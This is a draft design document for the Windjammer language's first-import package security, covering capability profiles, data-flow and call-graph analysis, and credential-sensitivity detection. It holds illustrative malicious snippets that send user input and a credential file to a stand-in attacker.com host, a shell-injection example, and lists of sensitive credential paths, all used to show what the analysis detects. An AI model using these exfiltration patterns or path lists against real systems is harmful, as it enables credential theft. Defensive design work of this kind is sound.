# WJ-SEC-04: Capability Profiles & First-Import Security

**Status:** 🟡 Draft  
**Author:** Windjammer Team  
**Date:** 2026-03-21  
**Target:** v0.51  
**Priority:** High  
**Depends On:** [WJ-SEC-01](./WJ-SEC-01-effect-capabilities.md), [WJ-SEC-03](./WJ-SEC-03-capability-lock-file.md)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Problem Statement: The First-Import Gap](#problem-statement-the-first-import-gap)
3. [Solution: Capability Profiles](#solution-capability-profiles)
4. [Heuristic-Based Analysis](#heuristic-based-analysis)
5. [Community Trust Signals](#community-trust-signals)
6. [Sandboxed Test Execution](#sandboxed-test-execution)
7. [Graduated Trust Model](#graduated-trust-model)
8. [Handling Legitimate Edge Cases](#handling-legitimate-edge-cases)
9. [Implementation Strategy](#implementation-strategy)

---

## Executive Summary

**Problem:** The lock file (WJ-SEC-03) prevents capability escalation in *updates*, but doesn't protect against *already-malicious* packages on first import.

**Solution:** Combine multiple signals to assess trustworthiness:
1. **Capability Profiles** - Expected capabilities for package categories (parsers, HTTP clients, etc.)
2. **Heuristic Analysis** - Statistical anomaly detection for suspicious patterns
3. **Community Signals** - Audit status, download counts, maintainer reputation
4. **Sandboxed Testing** - Run package tests in isolated environment, observe actual behavior
5. **Graduated Trust** - New/unknown packages get minimal capabilities by default

**Goal:** Make it **hard** to sneak malicious code in, while **easy** for legitimate libraries to declare their needs.

---

## Problem Statement: The First-Import Gap

### The Scenario

```bash
# Developer adds a new dependency
wj add json-parser
```

**Current behavior (WJ-SEC-03):**
1. Compiler analyzes `json-parser` code
2. Finds: `<logic_only>` + `<net_egress:attacker.com>` (MALICIOUS!)
3. Generates lock file with these capabilities
4. Build succeeds ❌

**Why this is bad:**
- First import creates the lock file *based on actual usage*
- If the package is *already malicious*, the lock file just records the malicious capabilities
- No warning, no alert, attack succeeds

### Example: Trojan JSON Parser

```windjammer
// json-parser/src/lib.wj (malicious from day 1)
pub fn parse(text: str) -> Value {
    // Parse JSON (legitimate)
    let result = tokenize_and_parse(text)
    
    // Exfiltrate data (MALICIOUS!)
    http.post("https://attacker.com/collect", text)
    
    result
}
```

**Current WJ-SEC-03 behavior:**
```toml
[dependencies.json-parser]
version = "1.0.0"
declared = ["logic_only"]  # Package LIES
verified = ["logic_only", "net_egress:attacker.com"]  # Truth
allowed = ["logic_only", "net_egress:attacker.com"]  # Grants both! ❌
```

**Build succeeds. Attack succeeds.** 🚨

### The Core Problem

**WJ-SEC-03 assumes:**
> "If verified capabilities don't exceed allowed, it's safe."

**But on first import:**
> `allowed = verified` (we grant whatever the package uses)

**Therefore:**
> First import has no security boundary!

---

## Solution: Capability Profiles

### Core Idea

**Capability Profiles** define *expected* capability patterns for different package categories:

```toml
# Built into wj compiler: capability-profiles.toml

[profiles.parser]
description = "Text parsers (JSON, XML, YAML, etc.)"
expected = ["logic_only"]
allow_with_justification = ["fs_read:./cache/*"]  # Caching is OK with docs
forbidden = ["net_egress", "net_ingress", "spawn", "eval"]

[profiles.http-client]
description = "HTTP/REST clients"
expected = ["net_egress"]
allow_with_justification = ["fs_write:./cache/*"]  # HTTP caching
forbidden = ["spawn", "eval", "fs_read:~/*"]  # No home directory access

[profiles.logger]
description = "Logging libraries"
expected = ["fs_write:./logs/*"]
allow_with_justification = ["net_egress"]  # Remote logging (Sentry, Datadog)
forbidden = ["fs_read:~/*", "env:*SECRET*"]  # No credential reading

[profiles.database-driver]
description = "Database clients (PostgreSQL, MySQL, Redis, etc.)"
expected = ["net_egress"]
allow_with_justification = ["fs_read:./config/*", "fs_write:./cache/*"]
forbidden = ["spawn", "eval", "fs_write:~/*"]

[profiles.image-processor]
description = "Image manipulation (resize, crop, filter)"
expected = ["logic_only"]
allow_with_justification = ["fs_read", "fs_write", "net_egress"]  # Read local, upload to CDN
forbidden = ["spawn", "eval", "env"]

[profiles.cryptography]
description = "Encryption, hashing, signing"
expected = ["logic_only"]
allow_with_justification = ["fs_read:/dev/urandom"]  # System entropy
forbidden = ["net_egress", "net_ingress"]  # Crypto should NEVER touch network

[profiles.cli-tool]
description = "Command-line applications"
expected = ["fs_read", "fs_write", "env", "spawn"]
allow_with_justification = ["net_egress"]  # Downloading updates, APIs
forbidden = []  # CLI tools have broader permissions

[profiles.unknown]
description = "Uncategorized packages"
expected = ["logic_only"]
allow_with_justification = []
forbidden = ["net_egress", "spawn", "eval"]  # Default deny dangerous capabilities
```

### Profile Assignment via Code Analysis

**The Windjammer Differentiator: Analyze what the code ACTUALLY does, not what it claims.**

#### Phase 1: Public API Analysis

```rust
struct ApiSignature {
    exports: Vec<FunctionSignature>,
    inputs: Vec<DataSource>,   // Where data comes from
    outputs: Vec<DataSink>,    // Where data goes
}

fn analyze_public_api(package: &Package) -> ApiSignature {
    let mut sig = ApiSignature::default();
    
    for func in package.public_functions() {
        // What does this function take?
        for param in func.params {
            if is_file_path_type(&param.ty) {
                sig.inputs.push(DataSource::Filesystem);
            } else if is_url_type(&param.ty) {
                sig.inputs.push(DataSource::Network);
            } else if is_string_type(&param.ty) {
                sig.inputs.push(DataSource::UserInput);
            }
        }
        
        // What does this function do?
        let capabilities = analyze_function_body(func);
        
        // What does this function return?
        if is_data_structure(&func.return_ty) {
            sig.outputs.push(DataSink::ReturnValue);
        }
        
        sig.exports.push(FunctionSignature {
            name: func.name,
            inputs: func.params,
            capabilities: capabilities,
            output: func.return_ty,
        });
    }
    
    sig
}
```

**Example: JSON Parser Analysis**
```windjammer
// Package code
pub fn parse(text: str) -> Value { /* ... */ }
pub fn stringify(value: Value) -> str { /* ... */ }
```

**Compiler analysis:**
```
Public API:
├─> parse(str) -> Value
│   ├─> Input: User-provided string
│   ├─> Capabilities: <logic_only>
│   └─> Output: Data structure
├─> stringify(Value) -> str
│   ├─> Input: Data structure
│   ├─> Capabilities: <logic_only>
│   └─> Output: String

Inferred purpose: Text transformation (parser/serializer)
Inferred profile: parser
Confidence: HIGH (no I/O operations, pure data transformation)
```

#### Phase 2: Data Flow Analysis

**Critical: Where does data flow?**

```rust
struct DataFlow {
    sources: Vec<DataSource>,
    transformations: Vec<Operation>,
    sinks: Vec<DataSink>,
    suspicious_paths: Vec<SuspiciousFlow>,
}

enum DataSource {
    UserInput,           // Function parameter
    Filesystem(PathPattern),  // fs.read_file()
    Network(UrlPattern),      // http.get()
    Environment,         // env.get()
    ProcessOutput,       // process.spawn()
}

enum DataSink {
    ReturnValue,         // Returns to caller
    Filesystem(PathPattern),  // fs.write_file()
    Network(UrlPattern),      // http.post()
    Process(String),     // process.spawn()
    Stdout,              // println!()
}

struct SuspiciousFlow {
    source: DataSource,
    sink: DataSink,
    severity: Severity,
    explanation: String,
}

fn analyze_data_flow(package: &Package) -> DataFlow {
    let mut flow = DataFlow::default();
    
    for func in package.all_functions() {
        let cfg = build_control_flow_graph(func);
        
        // Trace data from sources to sinks
        for path in cfg.all_paths() {
            let source = identify_source(&path);
            let sink = identify_sink(&path);
            
            // Flag suspicious flows
            match (source, sink) {
                (DataSource::Filesystem(p), DataSink::Network(u)) 
                    if p.matches("~/.ssh/*") || p.matches("~/.aws/*") => {
                    flow.suspicious_paths.push(SuspiciousFlow {
                        source,
                        sink,
                        severity: Severity::Critical,
                        explanation: "Reading credentials and sending to network".to_string(),
                    });
                }
                
                (DataSource::UserInput, DataSink::Process(_)) => {
                    flow.suspicious_paths.push(SuspiciousFlow {
                        source,
                        sink,
                        severity: Severity::High,
                        explanation: "User input flows to shell command (command injection risk)".to_string(),
                    });
                }
                
                _ => {}
            }
            
            flow.sources.push(source);
            flow.sinks.push(sink);
        }
    }
    
    flow
}
```

**Example: Malicious JSON Parser Detected**
```windjammer
// Malicious code (tries to hide network call)
pub fn parse(text: str) -> Value {
    let result = tokenize_and_parse(text)
    
    // Hidden in "helper" function
    send_analytics(text)
    
    result
}

fn send_analytics(data: str) {
    // Exfiltrate to attacker
    http.post("https://attacker.com/collect", data)
}
```

**Compiler analysis:**
```
Data flow analysis:

Source: parse() parameter 'text' (UserInput)
  ├─> Flows to: tokenize_and_parse() [SAFE - pure function]
  ├─> Flows to: send_analytics()
  └─> Flows to: http.post("attacker.com", ...) [SUSPICIOUS!]

🚨 SUSPICIOUS DATA FLOW DETECTED

Flow: UserInput → Network
├─> Source: Function parameter 'text'
├─> Sink: http.post("https://attacker.com/collect", ...)
├─> Severity: CRITICAL
└─> Explanation: "User-provided data exfiltrated to external server"

This is HIGHLY SUSPICIOUS for a parser.
Parsers should transform data, not send it over the network.
```

#### Phase 3: Behavioral Fingerprinting

**Create a "behavioral signature" from code analysis:**

```rust
struct BehaviorFingerprint {
    // What the code actually does
    capabilities_used: HashSet<Capability>,
    
    // I/O patterns
    reads_from: Vec<PathPattern>,
    writes_to: Vec<PathPattern>,
    connects_to: Vec<UrlPattern>,
    
    // Complexity metrics
    function_count: usize,
    exported_function_count: usize,
    avg_function_complexity: f64,
    
    // Suspicious patterns
    uses_eval: bool,
    spawns_processes: bool,
    reads_home_dir: bool,
    uses_cryptographic_apis: bool,
    has_hidden_network_calls: bool,  // Network in non-exported functions
}

fn create_fingerprint(package: &Package) -> BehaviorFingerprint {
    let api = analyze_public_api(package);
    let flow = analyze_data_flow(package);
    let capabilities = infer_capabilities(package);
    
    BehaviorFingerprint {
        capabilities_used: capabilities.iter().cloned().collect(),
        reads_from: flow.sources.iter()
            .filter_map(|s| match s {
                DataSource::Filesystem(p) => Some(p.clone()),
                _ => None,
            })
            .collect(),
        writes_to: flow.sinks.iter()
            .filter_map(|s| match s {
                DataSink::Filesystem(p) => Some(p.clone()),
                _ => None,
            })
            .collect(),
        connects_to: flow.sinks.iter()
            .filter_map(|s| match s {
                DataSink::Network(u) => Some(u.clone()),
                _ => None,
            })
            .collect(),
        
        function_count: package.all_functions().len(),
        exported_function_count: package.public_functions().len(),
        
        uses_eval: capabilities.contains(&Capability::Eval),
        spawns_processes: capabilities.contains(&Capability::Spawn),
        reads_home_dir: flow.sources.iter().any(|s| matches!(
            s, DataSource::Filesystem(p) if p.starts_with("~/")
        )),
        has_hidden_network_calls: has_network_in_private_functions(package),
    }
}
```

#### Phase 4: Purpose Inference from Behavior

**Infer the package's purpose from what the code ACTUALLY does:**

```rust
fn infer_purpose(fp: &BehaviorFingerprint, api: &ApiSignature) -> PackagePurpose {
    // Pure data transformation
    if fp.capabilities_used == set![Capability::LogicOnly] {
        if api.exports.iter().any(|f| f.name.contains("parse") || f.name.contains("decode")) {
            return PackagePurpose::Parser;
        }
        if api.exports.iter().any(|f| f.name.contains("hash") || f.name.contains("encrypt")) {
            return PackagePurpose::Cryptography;
        }
        return PackagePurpose::DataTransformation;
    }
    
    // Network-heavy
    if fp.capabilities_used.contains(&Capability::NetEgress) {
        if api.exports.iter().any(|f| f.name.contains("get") || f.name.contains("post")) {
            return PackagePurpose::HttpClient;
        }
        if fp.writes_to.iter().any(|p| p.contains("cache")) {
            return PackagePurpose::HttpClientWithCache;
        }
    }
    
    // File I/O heavy
    if fp.capabilities_used.contains(&Capability::FsWrite) {
        if fp.writes_to.iter().all(|p| p.contains("log")) {
            return PackagePurpose::Logger;
        }
        if fp.writes_to.iter().any(|p| p.contains("cache") || p.contains("tmp")) {
            return PackagePurpose::CachingLibrary;
        }
    }
    
    // Database-like
    if fp.capabilities_used.contains(&Capability::NetEgress) 
        && api.exports.iter().any(|f| f.name.contains("query") || f.name.contains("connect")) {
        return PackagePurpose::DatabaseDriver;
    }
    
    PackagePurpose::Unknown
}
```

**Example: Automatic Purpose Detection**
```windjammer
// Package code
pub fn get(url: str) -> Response { http.get(url) }
pub fn post(url: str, body: str) -> Response { http.post(url, body) }
```

**Compiler analysis:**
```
Behavioral fingerprint:
├─> Capabilities: [net_egress]
├─> Connects to: [user-provided URLs]
├─> Reads from: []
├─> Writes to: []
├─> Exported functions: get(), post()
└─> Function complexity: Low (thin wrappers)

Inferred purpose: HttpClient
Confidence: HIGH

Expected capabilities: [net_egress]
Forbidden: [spawn, eval, fs_read:~/*]
```

#### Phase 5: Anomaly Scoring

**Compare fingerprint to known-good packages:**

```rust
fn calculate_anomaly_score(
    fp: &BehaviorFingerprint,
    purpose: PackagePurpose,
    ecosystem: &EcosystemStats,
) -> AnomalyScore {
    let similar_packages = ecosystem.get_packages_with_purpose(purpose);
    
    let mut score = 0.0;
    
    // How many similar packages use these capabilities?
    for cap in &fp.capabilities_used {
        let frequency = similar_packages.iter()
            .filter(|p| p.fingerprint.capabilities_used.contains(cap))
            .count() as f64 / similar_packages.len() as f64;
        
        if frequency < 0.01 {  // <1% use this capability
            score += 15.0;
        } else if frequency < 0.10 {  // <10%
            score += 5.0;
        }
    }
    
    // Hidden network calls (in non-public functions)
    if fp.has_hidden_network_calls {
        let frequency = similar_packages.iter()
            .filter(|p| p.fingerprint.has_hidden_network_calls)
            .count() as f64 / similar_packages.len() as f64;
        
        if frequency < 0.05 {  // Very rare
            score += 20.0;  // High suspicion
        }
    }
    
    // Reading credentials
    if fp.reads_home_dir {
        score += 25.0;  // Always suspicious
    }
    
    AnomalyScore {
        score,
        verdict: if score > 20.0 { Verdict::HighRisk }
                 else if score > 10.0 { Verdict::Review }
                 else { Verdict::Safe },
    }
}
```

**Manual (in package metadata - optional):**
```toml
# json-parser/wj.toml
[package]
name = "json-parser"
version = "1.0.0"
profile = "parser"  # Optional hint (verified against actual code)
```

**If declared profile doesn't match analyzed behavior:**
```
⚠️  Profile mismatch detected

Declared profile: parser
Analyzed behavior: http-client (uses net_egress)

🚩 Package claims to be a parser but behaves like an HTTP client.
   This is SUSPICIOUS (possible misclassification or lying).

Using analyzed behavior, not declared profile.
```

---

## Code-Based Security Analysis (The Windjammer Differentiator)

### Why Code Analysis Beats Metadata

**Problem with metadata-based detection:**
- Package name: Easily spoofed (`json-parser` could be malicious)
- Keywords: Attacker-controlled (`["json", "parser", "safe"]`)
- Description: Lies (`"Fast, secure JSON parser"`)

**Windjammer's approach: Analyze what the code ACTUALLY does.**

### Red Flag Detection Patterns

#### Red Flag 1: Hidden Network Calls

**Legitimate parser:**
```windjammer
// All logic in public API
pub fn parse(text: str) -> Value {
    tokenize(text).build_ast()  // Pure functions
}
```

**Compiler analysis:**
```
├─> Public API: parse(str) -> Value
├─> Capabilities: <logic_only>
├─> Network calls: 0
└─> Verdict: SAFE (matches parser profile)
```

**Malicious parser:**
```windjammer
pub fn parse(text: str) -> Value {
    let result = tokenize(text).build_ast()
    
    // Hidden in "helper" function
    internal_telemetry(text)
    
    result
}

// Not in public API, hidden deep in call stack
fn internal_telemetry(data: str) {
    http.post("https://attacker.com/exfiltrate", data)
}
```

**Compiler analysis:**
```
├─> Public API: parse(str) -> Value
├─> Capabilities: <logic_only, net_egress>
├─> Network calls: 1 (in private function) 🚩
│   └─> http.post("attacker.com", user_data)
├─> Data flow: UserInput → Network 🚩🚩🚩
└─> Verdict: MALICIOUS

🚨 HIDDEN NETWORK CALL DETECTED

Public API claims: <logic_only>
Actual behavior: <net_egress>

Network call location: internal_telemetry() (PRIVATE function)
Data exfiltrated: User-provided 'text' parameter

Severity: CRITICAL
Explanation: Parser is secretly sending user data to external server.
```

**Key insight:** Windjammer analyzes ALL functions (public + private), not just exports.

#### Red Flag 2: Sensitive Data Access

**Challenge:** Hard-coded paths like `~/.ssh/*` are brittle. Different OSes, different apps, different conventions. Can't anticipate every sensitive location.

**Solution: Multi-Signal Sensitive Data Detection**

##### Signal 1: Content-Based Detection (Entropy & Format Analysis)

**Analyze what the FILE CONTAINS, not where it's located:**

```rust
fn analyze_file_sensitivity(path: &Path, contents: &[u8]) -> SensitivityScore {
    let mut score = 0.0;
    
    // High entropy = likely encrypted/keys
    let entropy = calculate_shannon_entropy(contents);
    if entropy > 7.5 {  // Near-random data
        score += 3.0;
    }
    
    // Check for cryptographic markers
    if contains_pem_headers(contents) {  // "-----BEGIN RSA PRIVATE KEY-----"
        score += 5.0;
    }
    if contains_ssh_key_format(contents) {
        score += 5.0;
    }
    if contains_pgp_headers(contents) {
        score += 5.0;
    }
    
    // Check for structured secrets
    if let Ok(json) = parse_json(contents) {
        if json.has_field("private_key") || 
           json.has_field("secret") ||
           json.has_field("access_token") {
            score += 4.0;
        }
    }
    
    // Small files are more likely to be credentials (not data files)
    if contents.len() < 10_000 {  // <10KB
        score += 1.0;
    }
    
    SensitivityScore {
        score,
        confidence: calculate_confidence(&contents),
        reasons: explain_score(&contents),
    }
}
```

##### Signal 2: Path-Based Heuristics (OS-Agnostic)

**Patterns that indicate sensitivity, regardless of OS:**

```rust
fn analyze_path_sensitivity(path: &Path) -> SensitivityScore {
    let mut score = 0.0;
    let path_str = path.to_string_lossy();
    
    // Hidden directories (Unix: .foo, Windows: System attribute)
    if is_hidden_directory(path) {
        score += 2.0;
    }
    
    // Common sensitive directory names (cross-platform)
    let sensitive_dirs = ["ssh", "gnupg", "aws", "azure", "gcloud", 
                          "docker", "kubernetes", "keys", "certificates",
                          "vault", "password-store", "keyring"];
    for dir in sensitive_dirs {
        if path_str.contains(dir) {
            score += 3.0;
            break;
        }
    }
    
    // File extensions indicating credentials
    let sensitive_exts = ["key", "pem", "p12", "pfx", "jks", "keystore",
                          "kdbx", "asc", "gpg", "pgp"];
    if let Some(ext) = path.extension() {
        if sensitive_exts.contains(&ext.to_str().unwrap()) {
            score += 3.0;
        }
    }
    
    // Special files per OS
    match std::env::consts::OS {
        "linux" | "macos" => {
            if path_str.contains("/.gnupg/") || 
               path_str.contains("/.password-store/") ||
               path_str.contains("/etc/shadow") {
                score += 5.0;
            }
        }
        "windows" => {
            if path_str.contains("\\AppData\\Local\\Microsoft\\Credentials") ||
               path_str.contains("\\Users\\") && path_str.contains("\\NTUSER.DAT") {
                score += 5.0;
            }
        }
        _ => {}
    }
    
    SensitivityScore { score, .. }
}
```

##### Signal 3: OS-Provided Sensitivity Markers

**Use operating system APIs when available:**

```rust
fn check_os_sensitivity_markers(path: &Path) -> bool {
    match std::env::consts::OS {
        "windows" => {
            // Windows Protected Folders API
            if is_protected_folder(path) {
                return true;
            }
            // Windows Data Loss Prevention (DLP) labels
            if has_dlp_label(path, "Confidential") {
                return true;
            }
        }
        "linux" => {
            // SELinux security context
            if get_selinux_context(path).contains("secret") {
                return true;
            }
            // AppArmor labels
            if has_apparmor_label(path, "confidential") {
                return true;
            }
        }
        "macos" => {
            // macOS Keychain items
            if is_keychain_item(path) {
                return true;
            }
            // File quarantine attributes
            if has_extended_attribute(path, "com.apple.quarantine") {
                return true;
            }
        }
        _ => {}
    }
    false
}
```

##### Signal 4: Community-Maintained Sensitive Path Database

**Crowdsourced knowledge, auto-updated:**

```toml
# ~/.wj/sensitive-paths-db.toml (auto-updated from registry)
version = "2026.03.21"

[patterns.ssh]
paths = ["~/.ssh/id_*", "~/.ssh/*_key"]
extensions = [".key", ".pem"]
confidence = "high"
os = ["linux", "macos", "windows"]

[patterns.aws]
paths = ["~/.aws/credentials", "~/.aws/config"]
extensions = []
confidence = "high"
os = ["all"]

[patterns.docker]
paths = ["~/.docker/config.json"]
confidence = "medium"
reason = "Contains registry credentials"

[patterns.browser-passwords]
paths = [
    "~/Library/Application Support/Google/Chrome/*/Login Data",  # macOS
    "~/.config/google-chrome/*/Login Data",  # Linux
    "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\*/Login Data"   # Windows
]
confidence = "critical"

# ... 500+ more patterns (community-maintained)
```

**Auto-update mechanism:**
```rust
// On build, check for updates
fn update_sensitive_paths_db() -> Result<(), Error> {
    let current_version = read_local_db_version()?;
    let latest_version = fetch_registry_db_version()?;
    
    if latest_version > current_version {
        let new_db = download_db(latest_version)?;
        verify_signature(&new_db)?;  // Signed by Windjammer team
        install_db(&new_db)?;
    }
    
    Ok(())
}
```

##### Signal 5: Runtime Access Pattern Analysis (Future)

**Learn from actual usage (optional telemetry):**

```rust
struct AccessPattern {
    path: PathBuf,
    access_count: u64,
    first_seen: DateTime,
    last_accessed: DateTime,
    always_same_app: bool,  // Only accessed by one program (e.g., ssh-agent)
}

fn infer_sensitivity_from_patterns(path: &Path) -> SensitivityScore {
    let pattern = get_access_pattern(path);
    
    let mut score = 0.0;
    
    // Rarely accessed = likely credential (not data file)
    if pattern.access_count < 10 && pattern.age_days() > 30 {
        score += 2.0;
    }
    
    // Only one application accesses it = likely credential
    if pattern.always_same_app {
        score += 2.0;
    }
    
    // Small file + rare access = likely credential
    if pattern.file_size < 10_000 && pattern.access_count < 5 {
        score += 3.0;
    }
    
    SensitivityScore { score, .. }
}
```

##### Combined Sensitivity Detection

**Aggregate all signals:**

```rust
fn is_sensitive_file_access(path: &Path, contents: Option<&[u8]>) -> SensitivityAssessment {
    let mut scores = Vec::new();
    
    // Signal 1: Content analysis (if available)
    if let Some(data) = contents {
        scores.push(analyze_file_sensitivity(path, data));
    }
    
    // Signal 2: Path heuristics
    scores.push(analyze_path_sensitivity(path));
    
    // Signal 3: OS markers
    if check_os_sensitivity_markers(path) {
        scores.push(SensitivityScore { score: 5.0, confidence: High, .. });
    }
    
    // Signal 4: Known patterns database
    scores.push(check_sensitive_paths_db(path));
    
    // Signal 5: Access patterns (optional)
    if let Some(pattern) = get_access_pattern(path) {
        scores.push(infer_sensitivity_from_patterns(path));
    }
    
    // Aggregate scores (weighted average, max, etc.)
    let total_score = scores.iter().map(|s| s.score).sum::<f64>();
    let max_confidence = scores.iter().map(|s| s.confidence).max();
    
    SensitivityAssessment {
        is_sensitive: total_score > 10.0,
        confidence: max_confidence.unwrap_or(Low),
        score: total_score,
        signals: scores,
    }
}
```

**Example detection:**

```windjammer
// Malicious code tries to read obscure credential file
let data = fs.read_file("/Users/bob/.config/rclone/rclone.conf")
http.post("https://attacker.com/exfiltrate", data)
```

**Compiler analysis:**
```
🚨 SENSITIVE FILE ACCESS DETECTED

File: /Users/bob/.config/rclone/rclone.conf
Sensitivity score: 12.5 / 20

Detection signals:
✓ High entropy content (7.8) - likely encrypted
✓ Hidden directory (.config)
✓ Small file size (2.3 KB)
✓ JSON with "access_token" field
✓ Known pattern: rclone configuration (contains cloud credentials)

Confidence: HIGH
Data flow: Sensitive file → Network

Verdict: CRITICAL (credential exfiltration)
```

**Key advantage:** Catches credentials even if path is unknown to us. Content analysis finds the secrets.

#### Red Flag 3: Suspicious Data Flow

**Pattern: Input → Sensitive Operation**

```windjammer
// Malicious CLI tool
pub fn run(user_cmd: str) {
    // Command injection vulnerability
    process.spawn("sh", ["-c", user_cmd])
}
```

**Compiler analysis:**
```
🚩 SUSPICIOUS DATA FLOW

Source: User input (parameter 'user_cmd')
Sink: process.spawn("sh", ["-c", ...])

Flow: UserInput → ShellExecution

Severity: HIGH
Explanation: User input flows directly to shell command.
This enables arbitrary code execution.

Recommendation: Use safe process spawning or sanitize input.
```

#### Red Flag 4: Purpose Mismatch

**Pattern: Claimed purpose doesn't match behavior**

```toml
# Package claims
[package]
name = "json-parser"
description = "Fast JSON parsing library"
keywords = ["json", "parser", "serialization"]
```

```windjammer
// But code does
pub fn parse(text: str) -> Value {
    let result = parse_json(text)
    
    // Why does a parser need network?
    http.post("https://analytics.example.com/usage", text)
    
    result
}
```

**Compiler analysis:**
```
⚠️  PURPOSE MISMATCH

Claimed purpose: Parser (from name, keywords, description)
Analyzed behavior: Parser + NetworkClient

Capability analysis:
├─> Expected (parser): <logic_only>
├─> Actual (analyzed): <logic_only, net_egress>
└─> Mismatch: Uses network (NOT expected for parsers)

Statistics:
├─> Similar packages: 1,247 parsers in ecosystem
├─> Use network: 3 (0.24%)
└─> Anomaly score: 18.5 / 20 (HIGH RISK)

Verdict: SUSPICIOUS (likely malicious or poorly designed)
```

### Control Flow Graph Analysis

**Example: Tracing data flow through complex code**

```windjammer
pub fn process_user_data(input: str) -> Result<(), Error> {
    let cleaned = sanitize(input)
    let validated = validate(cleaned)
    store_locally(validated)
    Ok(())
}

fn sanitize(data: str) -> str {
    data.replace("'", "''")
}

fn validate(data: str) -> str {
    if data.len() > 1000 { panic!("Too long") }
    data
}

fn store_locally(data: str) {
    // Looks innocent...
    fs.write_file("./cache/data.txt", data)
    
    // But also does this:
    send_to_backend(data)
}

fn send_to_backend(data: str) {
    http.post("https://api.example.com/collect", data)
}
```

**Compiler builds CFG:**
```
process_user_data(input: Tainted<str>)
  ├─> sanitize(input) → cleaned: str
  ├─> validate(cleaned) → validated: str
  └─> store_locally(validated)
      ├─> fs.write_file("./cache/data.txt", ...) [SAFE]
      └─> send_to_backend(validated)
          └─> http.post("https://api.example.com/collect", ...)

Data flow path:
  UserInput → sanitize → validate → store_locally → send_to_backend → Network
```

**Analysis result:**
```
ℹ️  Network usage detected

Function: process_user_data()
Purpose: Data processing
Capabilities: <fs_write, net_egress>

Call chain:
  process_user_data() → store_locally() → send_to_backend() → http.post()

This MAY be legitimate (backend synchronization).
Requires justification.
```

**If this is a "json-parser" package:**
```
🚨 SUSPICIOUS: Parser sending data to network

Expected (parser): <logic_only>
Actual: <fs_write, net_egress>

Parsers should NOT send user data to external servers.

Verdict: BLOCKED
```

**If this is a "cloud-sync" package:**
```
✅ Legitimate pattern for sync library

Expected (cloud-sync): <fs_read, fs_write, net_egress>
Actual: <fs_write, net_egress>

Justification: Cloud sync libraries inherently need network.
Verdict: ALLOWED (matches expected behavior)
```

### Call Graph Depth Analysis

**Detect deeply hidden malicious code:**

```rust
fn analyze_call_depth(package: &Package) -> CallGraphAnalysis {
    let call_graph = build_call_graph(package);
    
    let mut analysis = CallGraphAnalysis::default();
    
    // Find network/fs calls and their depth from public API
    for node in call_graph.nodes() {
        if let Some(io_call) = node.as_io_operation() {
            let depth = call_graph.depth_from_public_api(node);
            
            analysis.io_operations.push(IoOperation {
                call: io_call,
                depth: depth,
                function_chain: call_graph.path_from_public_api(node),
            });
            
            // Flag deeply hidden I/O (suspicion of obfuscation)
            if depth > 5 {
                analysis.suspicious_patterns.push(SuspiciousPattern::DeeplyHiddenIO {
                    call: io_call,
                    depth: depth,
                });
            }
        }
    }
    
    analysis
}
```

**Example:**
```
Public API: parse(str) -> Value
  └─> [depth 1] tokenize(str)
      └─> [depth 2] build_tokens(str)
          └─> [depth 3] process_chunk(str)
              └─> [depth 4] helper_fn(str)
                  └─> [depth 5] utility_fn(str)
                      └─> [depth 6] internal_analytics(str)
                          └─> [depth 7] http.post("attacker.com", ...) 🚩

⚠️  DEEPLY HIDDEN NETWORK CALL (depth 7)

Explanation: Network call is buried 7 levels deep in private functions.
This pattern is used to hide malicious behavior from casual code review.

Verdict: SUSPICIOUS (likely obfuscation)
```

---

## Profile Violation Detection

**On first import:**
```bash
wj add json-parser
```

**Compiler behavior (CODE ANALYSIS):**
```
Analyzing json-parser@1.0.0...

═══════════════════════════════════════════
PHASE 1: PUBLIC API ANALYSIS
═══════════════════════════════════════════

Exported functions:
├─> parse(text: str) -> Value
│   ├─> Parameters: text (user input)
│   ├─> Returns: Value (data structure)
│   └─> Analyzed behavior: String processing + NETWORK CALL 🚩
└─> stringify(value: Value) -> str
    ├─> Parameters: value (data structure)
    ├─> Returns: str
    └─> Analyzed behavior: Data serialization (safe)

═══════════════════════════════════════════
PHASE 2: DATA FLOW ANALYSIS
═══════════════════════════════════════════

Data flows detected:
1. parse() parameter 'text' → tokenize() → build_ast() [SAFE]
2. parse() parameter 'text' → http.post("attacker.com", ...) 🚩🚩🚩

Suspicious flow #1:
  Source: User input (parameter 'text')
  Sink: Network (http.post to attacker.com)
  Severity: CRITICAL
  Explanation: User-provided data exfiltrated to external server

═══════════════════════════════════════════
PHASE 3: BEHAVIORAL FINGERPRINT
═══════════════════════════════════════════

Capabilities used: [logic_only, net_egress]
├─> logic_only: String operations, AST building
└─> net_egress: http.post("https://attacker.com/collect", ...)

Network calls: 1
├─> Location: parse() → internal_telemetry() (HIDDEN in private function)
├─> Domain: attacker.com (unknown domain)
└─> Data sent: User input (SENSITIVE)

File access: None
Process spawning: None
Eval usage: None

═══════════════════════════════════════════
PHASE 4: PURPOSE INFERENCE
═══════════════════════════════════════════

Inferred purpose: Parser (text transformation)
├─> Rationale: Exports parse(), stringify()
├─> Rationale: Uses string operations, AST building
└─> Confidence: HIGH

Expected capabilities for parsers: [logic_only]
Actual capabilities: [logic_only, net_egress]
Mismatch: Uses network (NOT expected for parsers)

═══════════════════════════════════════════
PHASE 5: ANOMALY SCORING
═══════════════════════════════════════════

Ecosystem comparison:
├─> Similar packages: 1,247 parsers
├─> Using net_egress: 3 (0.24%)
└─> Anomaly score: 22.5 / 25 (CRITICAL)

Scoring breakdown:
+ 15.0: Network access (rare for parsers: 0.24%)
+ 5.0: Hidden network call (in private function)
+ 2.5: User input sent to network

═══════════════════════════════════════════
🚨 SECURITY VERDICT: MALICIOUS
═══════════════════════════════════════════

RED FLAGS:
🚩 Parser uses network (0.24% of parsers do this - highly anomalous)
🚩 Network call HIDDEN in private function (obfuscation pattern)
🚩 User data exfiltrated to attacker.com (unknown domain)
🚩 Package declares [logic_only] but code uses [net_egress] (LYING)

CONFIDENCE: 99% malicious
SEVERITY: CRITICAL

❌ Import blocked
❌ Package NOT added to dependencies
❌ Lock file NOT created

════════════════════════════════════════════
RECOMMENDED ACTIONS
════════════════════════════════════════════

1. Report malicious package:
   wj report json-parser@1.0.0 --reason "Data exfiltration to attacker.com"

2. Find trusted alternative:
   wj search json:audited
   wj search json:trusted

3. Manual review (if you really need this package):
   wj show json-parser@1.0.0 --source
   
4. Override (NOT RECOMMENDED):
   wj add json-parser --trust --audit "Manually reviewed, network call is legitimate"
   (This will NOT work for CRITICAL severity - hard blocked)
```

**Result:** Attack prevented at import time! ✅

### Advanced Code Analysis Techniques

#### Semantic Analysis: Understanding Intent

**Beyond syntax, analyze semantic meaning:**

```rust
